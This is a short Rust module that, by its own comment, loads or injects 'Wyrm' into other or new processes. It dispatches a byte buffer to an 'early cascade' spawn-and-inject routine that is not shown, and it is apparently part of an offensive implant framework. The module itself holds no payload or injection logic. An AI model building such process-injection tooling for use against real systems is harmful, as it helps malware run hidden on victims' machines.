//! A module for loading / injecting Wyrm into other / new processes.

use std::{
    fs::{self},
    path::PathBuf,
};

use shared::tasks::WyrmResult;

use crate::{
    native::filesystem::{PathParseType, parse_path},
    spawn_inject::early_cascade::early_cascade_spawn_child,
};

pub mod early_cascade;

pub enum SpawnMethod {
    EarlyCascade,
}

pub struct Spawn;

impl Spawn {
    pub fn spawn_child(buf: Vec<u8>, method: SpawnMethod, spawn_as: &str) -> WyrmResult<String> {
        match method {
            SpawnMethod::EarlyCascade => early_cascade_spawn_child(buf, spawn_as),
        }
    }
}
